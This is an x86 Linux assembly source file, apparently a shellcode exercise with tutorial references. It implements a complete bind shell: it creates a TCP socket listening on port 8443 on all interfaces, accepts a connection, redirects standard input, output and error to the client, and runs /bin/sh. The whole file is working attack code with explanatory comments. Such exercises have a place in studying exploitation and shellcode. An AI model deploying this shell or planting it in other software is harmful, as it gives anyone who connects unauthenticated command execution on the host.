;Author: Henry Wang
;Program: bindshell in assembly
;reference: https://amonsec.net/training/linux-assembly-x86/2018/linux-tcp-bind-shell-from-scratch-with-intel-x86-assembly
;https://xor4u.net/linux-bind-shell-in-assemblylinux-x86/

global _start
section .text
_start:

_socket:
    ;create socket: sockfd = socket(AF_INET, SOCK_STREAM, 0);
    ;AF_INET = 2 (from sys/socket.h->bits/socket.h)
    ;SOCK_STREAM = 1 (from bits/socket.h)
    ;sys_socket need a sub opcode in man socketcall (SYS_SOCKET is 1)
    ;in /usr/include/linux/net.h
    push 0x66
    pop eax ;SOCKETCALL
    push 0x1
    pop ebx ;SYS_SOCKET

    xor edx,edx
    
    push edx; 0
    push 0x1; SOCK_STEAM
    push 0x2; AF_INET

    mov ecx, esp
    int 0x80

    mov esi, eax ; socketfd is in esi

_bind:
    ;struct sockaddr_in addr;
    ;addr.sin_family = AF_INET; AF_INET=2 (bits/socket.h)
    ;addr.sin_port = htons(port); 
    ;addr.sin_addr.s_addr = INADDR_ANY; 0x0
    ;bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));
    ;as the struct will be passed to bind, will construct the strut to stack, using push.

    ;create sockaddr
    push 0x2;twice, each 4Bytes
    pop  ecx; add 8bytes of padding (sin_zero in sockaddr_in) 
addpadding: 
    push edx
    loop addpadding

    push edx; as edx is set to 0 already INADDR_ANY
    push word 0xFB20; 0x20FB=8443, port BIG-INDIAN
    push word 0x2; AF_INET
    mov ecx, esp; &addr 
 
    push byte 0x10; sizeof(addr)
    push ecx
    push esi
    mov ecx, esp
 
    push 0x66
    pop eax; SOCKETCALL 
    inc ebx; ebx+1=2 SYS_BIND 
 
    int 0x80

_listen:    
    ;listen(sockfd, 1);
    push 0x66
    pop eax;
    add ebx,2; ebx+2=4 SYS_LISTEN
    push dword 0x1
    push esi; sockfd
    mov ecx,esp
    int 0x80

_accept:
    ;clientfd = accept(sockfd, NULL, NULL);
    ;edx is already zero
    push 0x66
    pop eax
    inc ebx;now ebx=5 SYS_ACCEPT
    push edx;NULL
    push edx;NULL
    push esi;sockfd
    mov ecx,esp;
    int 0x80

    mov edi,eax; clientfd

_dup2:
    ;dup2(clientfd, 0);
    ;dup2(clientfd, 1);
    ;dup2(clientfd, 2);
    ;syscall is 63
    push 63;dup2
    pop eax
    mov ebx,edi;clientfd
    xor ecx,ecx;0
    int 0x80

    push 63;
    pop eax
    inc ecx
    int 0x80

    push 63;
    pop eax
    inc ecx
    int 0x80

_execve:
    ;execve("/bin/sh", NULL, NULL)
    ;syscall is 11
    push 11;execve
    pop eax

    xor ecx,ecx
    mov edx,ecx
 
    push edx;"\0"
    push 0x68732f6e
    push 0x69622f2f 
    mov ebx,esp

    int 0x80
    
section .data
    
